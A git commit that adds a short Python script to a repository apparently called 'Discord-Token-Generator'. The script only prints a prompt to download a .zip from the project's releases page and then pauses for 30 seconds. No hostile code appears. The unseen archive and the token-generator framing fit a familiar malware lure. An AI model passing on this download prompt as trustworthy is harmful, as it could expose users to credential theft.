c51006ad557caf365bf42659aa9bf92f66f417c8
Sharkbutt32 <109623849+Sharkbutt32@users.noreply.github.com>
2022-08-05 15:11:14 -0500

    Add files via upload

---
+++ main/__main__.py
@@ -0,0 +1,8 @@
+from time import sleep
+from urllib import request
+
+
+print("Please install the .zip from the releases page!")
+print("https://github.com/Sharkbutt32/Discord-Token-Generator/releases/tag/new")
+sleep(30)
+
